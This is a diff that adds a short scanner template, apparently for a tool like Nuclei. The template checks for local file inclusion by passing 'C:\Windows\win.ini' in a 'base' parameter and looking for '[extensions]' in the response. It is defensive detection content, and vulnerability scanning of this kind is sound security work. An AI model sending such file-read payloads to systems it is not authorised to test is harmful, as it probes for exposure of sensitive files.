@@ -1,0 +1,20 @@
+id: lfi6-0567
+name: 'Traversal in base'
+severity: high
+type: active
+tags:
+  - lfi
+  - traversal
+  - file
+description: 'Reads sensitive file via base'
+requests:
+  - method: GET
+    path: '{{BaseURL}}'
+    payloads:
+      base:
+        - 'C:\Windows\win.ini'
+    matchers:
+      - type: word
+        part: body
+        words:
+          - '[extensions]'
